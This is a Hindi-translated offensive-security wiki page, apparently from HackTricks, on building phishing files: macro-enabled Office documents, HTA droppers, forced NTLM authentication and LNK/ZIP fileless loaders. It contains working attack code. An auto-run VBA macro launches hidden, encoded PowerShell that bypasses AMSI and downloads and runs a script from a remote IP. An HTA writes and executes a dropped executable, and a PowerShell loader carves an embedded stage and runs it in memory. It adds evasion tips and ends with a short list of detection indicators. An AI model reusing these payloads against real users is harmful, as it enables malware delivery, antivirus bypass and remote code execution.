# Phishing फ़ाइलें और दस्तावेज़

{{#include ../../banners/hacktricks-training.md}}

## Office दस्तावेज़

Microsoft Word किसी फ़ाइल को खोलने से पहले फ़ाइल डेटा सत्यापन करता है। डेटा सत्यापन OfficeOpenXML standard के अनुसार डेटा संरचना की पहचान के रूप में किया जाता है। यदि डेटा संरचना की पहचान के दौरान कोई त्रुटि होती है, तो विश्लेषित की जा रही फ़ाइल नहीं खोली जाएगी।

आम तौर पर, macros वाली Word फ़ाइलें `.docm` एक्सटेंशन का उपयोग करती हैं। फिर भी, फ़ाइल एक्सटेंशन बदलकर फ़ाइल का नाम बदलना संभव है और उनकी macro निष्पादन क्षमताएँ बनी रह सकती हैं.\
उदाहरण के लिए, एक RTF फ़ाइल डिज़ाइन के अनुसार macros को सपोर्ट नहीं करती, लेकिन एक DOCM फ़ाइल जिसे RTF में नाम बदल दिया जाए, Microsoft Word द्वारा संभाली जाएगी और macro निष्पादन में सक्षम होगी.\
उसी आंतरिक संरचना और तंत्र Microsoft Office Suite (Excel, PowerPoint आदि) के सभी सॉफ़्टवेयर पर लागू होते हैं।

आप निम्नलिखित कमांड का उपयोग यह जांचने के लिए कर सकते हैं कि किन एक्सटेंशनों को कुछ Office प्रोग्राम्स द्वारा निष्पादित किया जाएगा:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### बाहरी इमेज लोड

जाएँ: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

दस्तावेज़ से macros का उपयोग करके arbitrary code चलाना संभव है।

#### Autoload functions

जितने अधिक सामान्य वे होंगे, AV द्वारा उन्हें पहचानने की संभावना उतनी ही अधिक होगी।

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### मैन्युअली मेटाडेटा हटाएँ

Go to **File > Info > Inspect Document > Inspect Document**, जो Document Inspector खोल देगा। **Inspect** पर क्लिक करें और फिर **Document Properties and Personal Information** के बगल में **Remove All** पर क्लिक करें।

#### Doc एक्सटेंशन

When finished, select **Save as type** dropdown, change the format from **`.docx`** to **Word 97-2003 `.doc`**.\
यह इसलिए करें क्योंकि आप `.docx` के अंदर macro सहेज नहीं सकते और macro-enabled **`.docm`** एक्सटेंशन के बारे में नकारात्मक धारणा है (उदा. थंबनेल आइकॉन पर बड़ा `!` दिखता है और कुछ वेब/ईमेल गेटवे इन्हें पूरी तरह ब्लॉक कर देते हैं)। इसलिए यह पुराना `.doc` एक्सटेंशन सबसे अच्छा समझौता है।

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA फ़ाइलें

HTA एक Windows प्रोग्राम है जो **HTML और scripting languages (जैसे VBScript और JScript)** को मिलाता है। यह उपयोगकर्ता इंटरफ़ेस बनाता है और ब्राउज़र की सुरक्षा मॉडल की पाबंदियों के बिना "fully trusted" एप्लिकेशन के रूप में निष्पादित होता है।

HTA को `mshta.exe` के माध्यम से चलाया जाता है, जो सामान्यतः Internet Explorer के साथ इंस्टॉल होता है, इसलिए `mshta` IE पर निर्भर होता है। यदि IE अनइंस्टॉल किया गया है तो HTA निष्पादन में सक्षम नहीं होंगे।
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM प्रमाणीकरण मजबूर करना

There are several ways to **force NTLM authentication "remotely"**, for example, you could add **invisible images** to emails or HTML that the user will access (even HTTP MitM?). Or send the victim the **address of files** that will **trigger** an **authentication** just for **opening the folder.**

**इन विचारों और अधिक को निम्नलिखित पृष्ठों में देखें:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

यह न भूलें कि आप केवल हैश या प्रमाणीकरण ही चुरा नहीं सकते बल्कि **NTLM relay attacks** भी अंजाम दे सकते हैं:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Highly effective campaigns deliver a ZIP that contains two legitimate decoy documents (PDF/DOCX) and a malicious .lnk. The trick is that the actual PowerShell loader is stored inside the ZIP’s raw bytes after a unique marker, and the .lnk carves and runs it fully in memory.

Typical flow implemented by the .lnk PowerShell one-liner:

1) सामान्य पथों में मूल ZIP का पता लगाएँ: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, and the parent of the current working directory.
2) ZIP bytes पढ़ें और एक hardcoded marker खोजें (e.g., xFIQCV). Everything after the marker is the embedded PowerShell payload.
3) ZIP को %ProgramData% में कॉपी करें, extract वहाँ करें, और वैध दिखने के लिए decoy .docx खोलें।
4) वर्तमान process के लिए AMSI बायपास करें: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) अगले चरण को deobfuscate करें (e.g., remove all # characters) और इसे memory में execute करें।

Example PowerShell skeleton to carve and run the embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
नोट्स
- Delivery अक्सर प्रतिष्ठित PaaS सबडोमेन का दुरुपयोग करता है (e.g., *.herokuapp.com) और payloads को gate कर सकता है (IP/UA के आधार पर benign ZIPs परोस सकता है)।
- अगला चरण अक्सर base64/XOR shellcode को decrypt करता है और disk artifacts को कम करने के लिए इसे Reflection.Emit + VirtualAlloc के माध्यम से execute करता है।

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control ताकि IE/Explorer या इसे embed करने वाला कोई भी app payload को स्वचालित रूप से फिर से लॉन्च कर दे। विवरण और तैयार-से-उपयोग कमांड यहाँ देखें:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP फ़ाइलें जिनमें archive data के अंत में ASCII marker string (e.g., xFIQCV) appended होती है।
- .lnk जो parent/user फ़ोल्डरों को enumerate करके ZIP ढूंढता है और एक decoy document खोलता है।
- AMSI में छेड़छाड़ via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- लंबे समय तक चलने वाले business threads जो trusted PaaS domains पर host किए गए links के साथ समाप्त होते हैं।

## संदर्भ

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
